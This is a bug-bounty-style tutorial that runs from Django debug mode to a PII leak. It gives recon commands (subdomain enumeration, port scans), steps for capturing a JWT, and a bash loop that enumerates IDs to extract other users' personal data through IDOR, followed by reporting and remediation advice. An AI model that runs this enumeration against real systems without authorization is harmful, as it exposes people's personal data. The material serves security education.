# From Django Debug Mode to PII Data Leak

**🔴🔴🔴 WARNING: ETHICAL USE AND LEGAL COMPLIANCE REQUIRED 🔴🔴🔴**

This document provides a detailed walkthrough for educational purposes, simulating a scenario where a misconfigured Django application (Debug Mode enabled) leads to the discovery of API endpoints and, eventually, an Insecure Direct Object Reference (IDOR) vulnerability, resulting in a PII data leak.

**YOU MUST ONLY APPLY THESE TECHNIQUES TO:**
1.  **Systems you OWN and have built for testing.**
2.  **Intentionally vulnerable applications in a controlled lab environment.**
3.  **Targets for which you have EXPLICIT, WRITTEN PERMISSION from the owner (e.g., official bug bounty programs, within defined scope).**

**UNAUTHORIZED ACCESS OR TESTING IS ILLEGAL AND UNETHICAL. YOU ARE RESPONSIBLE FOR YOUR ACTIONS.**

---

## Table of Contents
1.  [Objective & Scenario Overview](#1-objective--scenario-overview)
2.  [Prerequisites & Lab Setup (Conceptual)](#2-prerequisites--lab-setup-conceptual)
3.  [Phase 1: Reconnaissance - Subdomain Enumeration & Port Scanning](#3-phase-1-reconnaissance---subdomain-enumeration--port-scanning)
    *   [3.1. Subdomain Enumeration Tools](#31-subdomain-enumeration-tools)
    *   [3.2. Resolving Live Subdomains](#32-resolving-live-subdomains)
    *   [3.3. Port Scanning](#33-port-scanning)
4.  [Phase 2: Target Interaction & Vulnerability Discovery](#4-phase-2-target-interaction--vulnerability-discovery)
    *   [4.1. Investigating Open Ports (e.g., Port 8443)](#41-investigating-open-ports-eg-port-8443)
    *   [4.2. Triggering Django Debug Mode](#42-triggering-django-debug-mode)
    *   [4.3. Discovering API Documentation (Swagger/OpenAPI)](#43-discovering-api-documentation-swaggeropenapi)
    *   [4.4. Investigating Other Services (e.g., Port 443) & Obtaining Authentication](#44-investigating-other-services-eg-port-443--obtaining-authentication)
    *   [4.5. Using Obtained Credentials with API Documentation](#45-using-obtained-credentials-with-api-documentation)
5.  [Phase 3: Exploitation - API Endpoint Testing & IDOR](#5-phase-3-exploitation---api-endpoint-testing--idor)
    *   [5.1. Identifying Target API Endpoints](#51-identifying-target-api-endpoints)
    *   [5.2. Testing Endpoints with ID Parameter (IDOR Attempt)](#52-testing-endpoints-with-id-parameter-idor-attempt)
    *   [5.3. Confirming Data Leak](#53-confirming-data-leak)
6.  [Phase 4: Documentation & Ethical Reporting](#6-phase-4-documentation--ethical-reporting)
7.  [Remediation & Prevention Strategies](#7-remediation--prevention-strategies)
8.  [Conclusion](#8-conclusion)

---

## 1. Objective & Scenario Overview

*   **Objective:** To simulate and understand the process by which a series of reconnaissance steps and vulnerability discoveries on a web application can lead from an initial finding (like Django Debug Mode) to a significant data breach (PII leak via IDOR).
*   **Scenario Simulated:**
    1.  Discovering subdomains of a target.
    2.  Identifying open ports on a specific subdomain.
    3.  Finding Django Debug Mode enabled on one port, revealing API structure (e.g., via Swagger UI).
    4.  Finding a separate login/signup mechanism on another port of the same subdomain.
    5.  Obtaining a valid authentication token (e.g., JWT) through legitimate signup/login.
    6.  Using the token to authenticate with the previously discovered Swagger UI.
    7.  Identifying API endpoints that take an ID as a parameter.
    8.  Exploiting an Insecure Direct Object Reference (IDOR) vulnerability by manipulating the ID parameter to access data of other users/employees.
*   **Ethical Context:** This entire process is to be performed **only on authorized targets in a lab environment.**

---

## 2. Prerequisites & Lab Setup (Conceptual)

For this educational simulation, you would ideally have:

*   **A Target Application (Lab Environment):**
    *   A custom-built Django application where you can intentionally enable `DEBUG = True` in `settings.py`.
    *   This application should have an API (e.g., built with Django REST Framework).
    *   It should have API documentation like Swagger/OpenAPI accessible (often at `/swagger/`, `/openapi/`, `/api/docs/`).
    *   It should have a user registration and login system that issues tokens (e.g., JWT).
    *   Crucially, it should have an API endpoint vulnerable to IDOR (e.g., `/api/users/{id}/` where the `{id}` is not properly checked against the authenticated user's permissions).
    *   This application might be configured to run on multiple ports for the sake of the scenario (e.g., a dev server on 8443, a "production-like" interface on 443).
*   **Tools Environment (as per previous README, including):**
    *   `subfinder`, `amass`, `assetfinder` (or choose one/two for simplicity in a lab).
    *   `alterx` (for generating permutations of subdomains - optional, adds complexity).
    *   `httpx` (to resolve live subdomains and check status codes).
    *   `naabu` (or `nmap` for port scanning).
    *   Web Browser with Developer Tools.
    *   `curl` or a tool like Postman/Insomnia for API requests.
    *   Burp Suite (Community or Pro) for intercepting requests and observing tokens.
*   **Placeholders for this Guide:**
    *   We'll use `redacted.com` as the placeholder for the main target domain.
    *   We'll use `3ntern1l.redacted.com` as the specific subdomain of interest.
    *   **YOU MUST REPLACE THESE with your actual authorized lab target details.**

    ```bash
    # In your notes or a shell script for convenience
    export TARGET_DOMAIN="your-lab-domain.com" # !!! REPLACE: e.g., mydjangolab.local !!!
    export SUBDOMAIN_OF_INTEREST="internal-dev.${TARGET_DOMAIN}" # !!! REPLACE: e.g., api.mydjangolab.local !!!
    # For this scenario, we won't set a TARGET_BASE_URL yet, as we'll derive it from live subdomains.
    ```

---

## 3. Phase 1: Reconnaissance - Subdomain Enumeration & Port Scanning

### 3.1. Subdomain Enumeration Tools

Collect potential subdomains using various tools.

*   **Code (Shell - conceptual, run each tool and manage output):**
    ```bash
    # Ensure TARGET_DOMAIN is set, e.g., export TARGET_DOMAIN="your-lab-domain.com"

    echo "[INFO] Running Subfinder for ${TARGET_DOMAIN}..."
    subfinder -d "${TARGET_DOMAIN}" -o "subfinder_${TARGET_DOMAIN}.txt" -silent

    echo "[INFO] Running Amass (passive) for ${TARGET_DOMAIN}..."
    # Amass can be resource-intensive; for a lab, passive might be sufficient.
    amass enum -passive -d "${TARGET_DOMAIN}" -o "amass_${TARGET_DOMAIN}.txt"

    echo "[INFO] Running Assetfinder for ${TARGET_DOMAIN}..."
    # Assetfinder expects input via stdin
    echo "${TARGET_DOMAIN}" | assetfinder --subs-only > "assetfinder_${TARGET_DOMAIN}.txt"

    echo "[INFO] Combining and sorting unique subdomains..."
    cat "subfinder_${TARGET_DOMAIN}.txt" "amass_${TARGET_DOMAIN}.txt" "assetfinder_${TARGET_DOMAIN}.txt" | sort -u > "all_subdomains_raw_${TARGET_DOMAIN}.txt"

    echo "[INFO] Raw subdomains saved to all_subdomains_raw_${TARGET_DOMAIN}.txt"
    wc -l "all_subdomains_raw_${TARGET_DOMAIN}.txt"

    # Optional: Using alterx for permutations (can generate many invalid hosts)
    # if command -v alterx &> /dev/null; then
    #     echo "[INFO] Generating permutations with alterx..."
    #     cat "all_subdomains_raw_${TARGET_DOMAIN}.txt" | alterx -enrich -silent > "all_subdomains_permuted_${TARGET_DOMAIN}.txt"
    #     echo "[INFO] Permuted subdomains saved to all_subdomains_permuted_${TARGET_DOMAIN}.txt"
    #     TARGET_SUBDOMAIN_LIST="all_subdomains_permuted_${TARGET_DOMAIN}.txt"
    # else
    #     echo "[INFO] alterx not found, using raw subdomains list."
    TARGET_SUBDOMAIN_LIST="all_subdomains_raw_${TARGET_DOMAIN}.txt"
    # fi
    # For simplicity in a lab, you might just use the raw list or even a manually defined list if tools are too much.
    ```
    *   **Educational Note:** In a real scenario, `anew` (from tomnomnom's `anew` tool) is often used to append unique lines to a file. For this guide, simple redirection and `sort -u` suffice.

### 3.2. Resolving Live Subdomains

Check which of the enumerated subdomains are actually live and return a successful HTTP status code (e.g., 200 OK).

*   **Code (Shell - using `httpx`):**
    ```bash
    # Ensure TARGET_SUBDOMAIN_LIST is set from the previous step.
    # For a lab, if you have a specific subdomain, you can create a file with just that:
    # echo "internal-dev.your-lab-domain.com" > my_lab_subdomains.txt
    # export TARGET_SUBDOMAIN_LIST="my_lab_subdomains.txt"

    if [ ! -f "${TARGET_SUBDOMAIN_LIST}" ]; then
        echo "[ERROR] Subdomain list ${TARGET_SUBDOMAIN_LIST} not found. Run previous steps."
        exit 1
    fi
    if ! command -v httpx &> /dev/null; then
        echo "[ERROR] httpx not found. Please install projectdiscovery/httpx."
        exit 1
    fi

    echo "[INFO] Probing live subdomains from ${TARGET_SUBDOMAIN_LIST} with httpx..."
    # -mc 200: Match only status code 200. You might expand this (e.g., -mc 200,301,302,403)
    # -silent: Suppress errors for non-resolving hosts
    # -threads: Adjust as needed
    # -title: Get page titles
    # -tech-detect: Basic technology detection
    cat "${TARGET_SUBDOMAIN_LIST}" | httpx -mc 200 -silent -threads 50 -title -tech-detect -o "live_subdomains_200_${TARGET_DOMAIN}.txt"

    if [ -s "live_subdomains_200_${TARGET_DOMAIN}.txt" ]; then
        echo "[SUCCESS] Live subdomains (status 200) saved to live_subdomains_200_${TARGET_DOMAIN}.txt:"
        cat "live_subdomains_200_${TARGET_DOMAIN}.txt"
    else
        echo "[INFO] No live subdomains with status 200 found by httpx."
    fi
    ```
    *   **Focus:** From this output, you would identify your target `SUBDOMAIN_OF_INTEREST` (e.g., `internal-dev.your-lab-domain.com` or the scenario's `3ntern1l.redacted.com`).

### 3.3. Port Scanning

Scan the identified live subdomain(s) of interest for open ports.

*   **Code (Shell - using `naabu` or `nmap`):**
    ```bash
    # Ensure SUBDOMAIN_OF_INTEREST is set, e.g., export SUBDOMAIN_OF_INTEREST="internal-dev.your-lab-domain.com"
    # If SUBDOMAIN_OF_INTEREST is not set, you can scan all live ones, but that can be slow.
    # For this scenario, we focus on one.

    SCAN_TARGET_HOST="${SUBDOMAIN_OF_INTEREST}"
    if [ -z "${SCAN_TARGET_HOST}" ]; then
        echo "[ERROR] SUBDOMAIN_OF_INTEREST is not set. Cannot perform targeted port scan."
        exit 1
    fi

    echo "[INFO] Port scanning ${SCAN_TARGET_HOST}..."

    # Option 1: Using Naabu (fast)
    if command -v naabu &> /dev/null; then
        echo "[INFO] Using naabu for port scanning top 1000 ports..."
        # -top-ports 1000: Scan the 1000 most common ports
        # -silent: Suppress banner
        # -o: Output file
        naabu -host "${SCAN_TARGET_HOST}" -top-ports 1000 -silent -o "portscan_naabu_${SCAN_TARGET_HOST}.txt"
        if [ -s "portscan_naabu_${SCAN_TARGET_HOST}.txt" ]; then
            echo "[SUCCESS] Naabu port scan results for ${SCAN_TARGET_HOST} saved to portscan_naabu_${SCAN_TARGET_HOST}.txt:"
            cat "portscan_naabu_${SCAN_TARGET_HOST}.txt"
        else
            echo "[INFO] Naabu found no open ports in the top 1000 for ${SCAN_TARGET_HOST}."
        fi
    else
        echo "[WARN] naabu command not found. Consider installing projectdiscovery/naabu."
    fi

    # Option 2: Using Nmap (versatile, more detailed)
    if command -v nmap &> /dev/null; then
        echo "[INFO] Using nmap for port scanning (Top 1000 TCP ports, service version detection)..."
        # -sV: Service/Version detection
        # -T4: Aggressive timing (be careful with this on non-lab targets)
        # --top-ports 1000: Scan common ports
        # -oN: Normal output
        nmap -sV -T4 --top-ports 1000 "${SCAN_TARGET_HOST}" -oN "portscan_nmap_${SCAN_TARGET_HOST}.txt"
        echo "[SUCCESS] Nmap port scan results for ${SCAN_TARGET_HOST} saved to portscan_nmap_${SCAN_TARGET_HOST}.txt:"
        cat "portscan_nmap_${SCAN_TARGET_HOST}.txt"
    else
        echo "[WARN] nmap command not found. Consider installing nmap."
    fi
    ```
    *   **Scenario Outcome:** The story says for `3ntern1l.redacted.com`, ports `8443` and `443` were found open. You'd note these.

---

## 4. Phase 2: Target Interaction & Vulnerability Discovery

### 4.1. Investigating Open Ports (e.g., Port 8443)

Browse to the services running on the discovered open ports.

*   **Action:** Open your web browser and navigate to:
    *   `https://{SUBDOMAIN_OF_INTEREST}:8443`
    *   `https://{SUBDOMAIN_OF_INTEREST}:443` (or `http://` if SSL is not on 443, but the scenario implies HTTPS)
*   **Educational Note:** You might encounter SSL certificate warnings if they are self-signed in your lab. You can usually bypass these in the browser for lab testing.

### 4.2. Triggering Django Debug Mode

If a Django application has `DEBUG = True` in its `settings.py`, it often reveals detailed error pages when an unhandled exception occurs or a non-existent URL is requested.

*   **Action:** On the service running on port 8443 (`https://{SUBDOMAIN_OF_INTEREST}:8443`), try to trigger an error by appending a random string or a non-existent path to the URL.
    *   Example: `https://{SUBDOMAIN_OF_INTEREST}:8443/ThisPathShouldNotExist123`
*   **Expected Result (If Debug Mode is ON):** You'll see a Django technical debug page, which is yellow and provides extensive information including settings, stack traces, and sometimes URL patterns.
*   **Code (Conceptual `curl` to check for debug indicators):**
    ```bash
    # Ensure SUBDOMAIN_OF_INTEREST is set
    DEBUG_TEST_URL="https://${SUBDOMAIN_OF_INTEREST}:8443/HopefullyThisPathDoesNotExistAndTriggersDebug"

    echo "[INFO] Attempting to trigger Django Debug Mode on ${DEBUG_TEST_URL}"
    # -k or --insecure is used here for labs with self-signed certs. REMOVE for real authorized targets with valid certs.
    # Look for common Django debug page phrases.
    curl -s -k -L "${DEBUG_TEST_URL}" | grep -iE 'Django Version|Traceback|Settings|You.re seeing this error because you have DEBUG = True'

    # If grep finds matches, it's a strong indicator. Visual confirmation in browser is best.
    ```

### 4.3. Discovering API Documentation (Swagger/OpenAPI)

Django Debug pages can sometimes list all configured URL patterns, or common paths like `/swagger/`, `/openapi/`, `/api/docs/`, `/redoc/` might exist if Django REST Framework with a schema generator is used.

*   **Action:**
    1.  Examine the Django Debug page (if found) for URL patterns or links to API documentation.
    2.  Manually try common API documentation paths on `https://{SUBDOMAIN_OF_INTEREST}:8443/`
        *   `https://{SUBDOMAIN_OF_INTEREST}:8443/swagger/`
        *   `https://{SUBDOMAIN_OF_INTEREST}:8443/api/docs/`
        *   `https://{SUBDOMAIN_OF_INTEREST}:8443/openapi/`
*   **Scenario Outcome:** "Using the Swagger endpoint, I was successfully able to access the Swagger UI Dashboard."
*   **Swagger UI:** This interactive API documentation allows you to see endpoints, their parameters, and try them out (often requiring authorization).

### 4.4. Investigating Other Services (e.g., Port 443) & Obtaining Authentication

The scenario states that port 443 on the same subdomain (`https://{SUBDOMAIN_OF_INTEREST}:443` or just `https://{SUBDOMAIN_OF_INTEREST}/` if 443 is default HTTPS) had a Login and Sign Up page.

*   **Action:**
    1.  Navigate to `https://{SUBDOMAIN_OF_INTEREST}/` (or `https://{SUBDOMAIN_OF_INTEREST}:443/`).
    2.  Find the "Sign Up" page.
    3.  Register a new user account with test credentials (e.g., `testuser@lab.example.com`, `TestP@ssword123`).
    4.  Log in with the newly created account.
    5.  **Intercept Traffic (Using Burp Suite):**
        *   Configure your browser to proxy traffic through Burp Suite.
        *   Perform the login.
        *   In Burp Suite's "HTTP history" (Proxy tab), find the login request and subsequent requests to the dashboard.
        *   Look for an `Authorization` header, typically containing a `Bearer <JWT_TOKEN>` or similar.
        *   Also check response bodies or cookies for tokens.
*   **Scenario Outcome:** "In the burp-request, I also found the JWT Token."
*   **Code (Conceptual - Not for direct execution, as this requires browser interaction & Burp):**
    ```
    # This step is manual:
    # 1. Open https://{SUBDOMAIN_OF_INTEREST}/ in browser (proxying through Burp).
    # 2. Click "Sign Up", fill form, submit.
    # 3. Click "Login", fill form, submit.
    # 4. In Burp > Proxy > HTTP History:
    #    - Find requests made AFTER successful login.
    #    - Inspect Request Headers for "Authorization: Bearer eyJhbGciOi..." (JWT).
    #    - Copy the full JWT token value.
    ```
    ```bash
    # Store the found token
    export OBTAINED_JWT_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" # !!! REPLACE with actual token copied from Burp !!!
    echo "[AUTH] JWT Token obtained (manually from Burp): ${OBTAINED_JWT_TOKEN}"
    ```

### 4.5. Using Obtained Credentials with API Documentation

Go back to the Swagger UI found on port 8443 and use the JWT token to authorize your requests.

*   **Action:**
    1.  Navigate back to the Swagger UI URL (e.g., `https://{SUBDOMAIN_OF_INTEREST}:8443/swagger/`).
    2.  Look for an "Authorize" button or a way to input an API key/token.
    3.  If it expects a Bearer token, you might input `Bearer {OBTAINED_JWT_TOKEN}` or just the token itself, depending on the UI. Often there's a field for "apiKey" or "JWT" where you paste the token.
*   **Scenario Outcome:** "I immediately copied the JWT token and pasted on the Swagger UI Dashboard. I was successfully able to access the API endpoints available on the dashboard."
*   **Educational Note:** After authorizing, the "Try it out" buttons in Swagger UI should now work for endpoints that require authentication.

---

## 5. Phase 3: Exploitation - API Endpoint Testing & IDOR

With authorized access to the API via Swagger UI, look for vulnerabilities.

### 5.1. Identifying Target API Endpoints

Review the available API endpoints in Swagger UI.

*   **Action:** Look for endpoints that:
    *   Retrieve user or employee data.
    *   Take an `id` (or `userId`, `employeeId`, etc.) as a path parameter or query parameter.
    *   Examples: `/api/users/{id}`, `/api/employees/{id}/profile`, `/api/data?user_id={id}`.
*   **Scenario Outcome:** "I found 2–3 endpoints requires only an id input from the user."

### 5.2. Testing Endpoints with ID Parameter (IDOR Attempt)

This is where you test for Insecure Direct Object Reference (IDOR). The goal is to see if you can access data for an ID other than your own user's ID.

*   **Action (Using Swagger UI "Try it out" or `curl`/Postman):**
    1.  **Find your own user ID:** Sometimes an API endpoint like `/api/me` or `/api/users/current` will reveal your own user ID in the response after you log in. If not, you might have to guess or infer it if the application uses sequential IDs (e.g., if you were the 10th user to sign up, your ID might be 10).
    2.  **Test with your own ID:** Use an endpoint like `/api/users/{id}` with your own ID to confirm it works and to see the expected data structure.
    3.  **Test with other IDs:**
        *   Try small integer IDs: `1`, `2`, `3`, ...
        *   Try IDs near your own: if your ID is `123`, try `122`, `124`.
        *   Try IDs from a different range if you suspect multiple types of users.
*   **Code (Conceptual `curl` for testing one endpoint with different IDs):**
    ```bash
    # Ensure SUBDOMAIN_OF_INTEREST, OBTAINED_JWT_TOKEN are set.
    # Assume the vulnerable endpoint is /api/employees/{id}/details
    # Assume your user ID is (e.g.) 50.

    TARGET_API_BASE_URL="https://${SUBDOMAIN_OF_INTEREST}:8443" # Or wherever the API is served from
    VULN_API_ENDPOINT_PATTERN="/api/employees/{ID_PLACEHOLDER}/details" # Path from Swagger

    # Test with your own ID first (e.g., if your ID is 50)
    # MY_ID=50
    # ID_TO_TEST=$MY_ID

    # Loop through a range of IDs to test for IDOR
    echo "[INFO] Testing for IDOR on endpoint pattern: ${VULN_API_ENDPOINT_PATTERN}"
    for id_to_test in {1..10} {45..55} {500..510}; do # Example ID ranges
        CURRENT_API_ENDPOINT="${VULN_API_ENDPOINT_PATTERN/\{ID_PLACEHOLDER\}/${id_to_test}}"
        FULL_API_URL="${TARGET_API_BASE_URL}${CURRENT_API_ENDPOINT}"

        echo "[TRYING IDOR] Testing ID: ${id_to_test} on URL: ${FULL_API_URL}"
        # -k for self-signed certs in lab
        # Assuming JWT is sent as a Bearer token in Authorization header
        response_json=$(curl -s -k -L -X GET "${FULL_API_URL}" \
             -H "Authorization: Bearer ${OBTAINED_JWT_TOKEN}" \
             -H "Content-Type: application/json")

        # Basic check for non-empty response or specific keywords indicating success
        if [[ -n "$response_json" ]] && [[ "$response_json" != *"error"* ]] && [[ "$response_json" != *"not found"* ]] && [[ "$response_json" != *"unauthorized"* ]]; then
            echo -e "\033[0;32m[POTENTIAL IDOR SUCCESS] ID: ${id_to_test} - Response received:\033[0m"
            echo "${response_json}" | jq . # Requires jq to be installed for pretty printing JSON
            # In a real test, you'd compare if the data is different from your own and looks like another user's PII.
            # If your ID is 50, and you get valid data for ID 51, that's an IDOR.
            echo "-------------------------------------"
        else
            echo "[INFO] ID: ${id_to_test} - No data or error response."
        fi
        sleep 0.2 # Be respectful to the server
    done
    ```
    *   **To Run (Conceptual):** Save as `idor_tester.sh`, set environment variables, `chmod +x idor_tester.sh`, `./idor_tester.sh`.
    *   **Crucial Check:** If you are user ID `X` and you can retrieve data for user ID `Y` (where `X != Y`) and the data is clearly PII of user `Y`, then you have found an IDOR.

### 5.3. Confirming Data Leak

*   **Scenario Outcome:** "The data exposed includes the PII data such as first name, last name, professional email address, phone number, etc of more than 500+ employees registered on the subdomain."
*   **Action:** Analyze the responses from successful IDOR attempts. Verify that the data retrieved belongs to other users and contains Personally Identifiable Information (PII). Count how many unique user records you can access to understand the scope.

---

## 6. Phase 4: Documentation & Ethical Reporting

If this were a real authorized test (e.g., bug bounty):

*   **Stop Testing:** Once PII is confirmed to be leaking for multiple users, stop further exploitation to minimize impact and data access.
*   **Document Everything:**
    *   Subdomain discovered: `3ntern1l.redacted.com`
    *   Open ports: `8443`, `443`
    *   How Django Debug Mode was triggered on port `8443`.
    *   Swagger UI endpoint: e.g., `https://3ntern1l.redacted.com:8443/swagger/`
    *   How authentication token was obtained via port `443` (signup/login).
    *   The specific vulnerable API endpoint(s) (e.g., `/api/employees/{id}/details`).
    *   Example IDs that successfully retrieved other users' data.
    *   Types of PII exposed (first name, last name, email, phone, etc.).
    *   Estimated number of affected records (e.g., "PII for over 500 employees").
    *   Screenshots and `curl` commands/responses as evidence.
*   **Report Immediately:** Report the findings to the appropriate security contact for the application (e.g., through the bug bounty platform, or the company's security email). Provide clear, concise, and actionable information.

---

## 7. Remediation & Prevention Strategies

*   **Disable Debug Mode in Production:** **Crucially, `DEBUG` must be `False` in Django's `settings.py` for all production environments.** This is the primary preventative measure for the initial entry point in this scenario.
*   **Secure API Documentation:** If Swagger/OpenAPI UIs are exposed, they should require authentication/authorization, especially if they list sensitive endpoints or are on internal/dev environments that accidentally become public.
*   **Proper Authorization Checks (Fixing IDOR):**
    *   For any API endpoint that accesses user-specific data using an ID, the backend **MUST** verify that the authenticated user making the request is authorized to access the data for the requested ID.
    *   Example: If user A (ID 10) requests `/api/users/11/profile`, the server should check if user A has permission to view user 11's profile (usually, they don't, unless user A is an admin with specific privileges).
*   **Use Non-Guessable IDs:** While not a complete fix for IDOR if authorization is missing, using UUIDs instead of sequential integers for user IDs can make it harder for attackers to guess valid IDs of other users.
*   **Principle of Least Privilege:** Users (and their API tokens) should only have access to the data and actions they absolutely need.
*   **Input Validation:** Validate all user-supplied input, including IDs in URLs or request bodies.
*   **Rate Limiting:** Implement rate limiting on API endpoints to slow down automated attempts to enumerate IDs.
*   **Regular Security Audits & Penetration Testing:** Proactively find and fix such vulnerabilities.
*   **Network Segmentation:** Ensure development/staging environments with debug features are not publicly accessible or are strictly firewalled.

---

## 8. Conclusion

This educational walkthrough simulated a chain of events starting from a common misconfiguration (Django Debug Mode) and culminating in a severe PII data leak due to an IDOR vulnerability in an API. It highlights how multiple, sometimes seemingly minor, issues can combine to create significant security risks.

**Key Takeaways for Developers & Security Professionals:**
*   Always disable debug modes in production.
*   Implement robust server-side authorization for all data access.
*   Be mindful of what information is exposed in client-side code and API documentation.
*   Regularly test applications for common vulnerabilities like IDOR.

**Remember to always conduct security testing ethically and legally within authorized environments.**

---
**Follow @muneebwanee for more Hacking Tutorials**
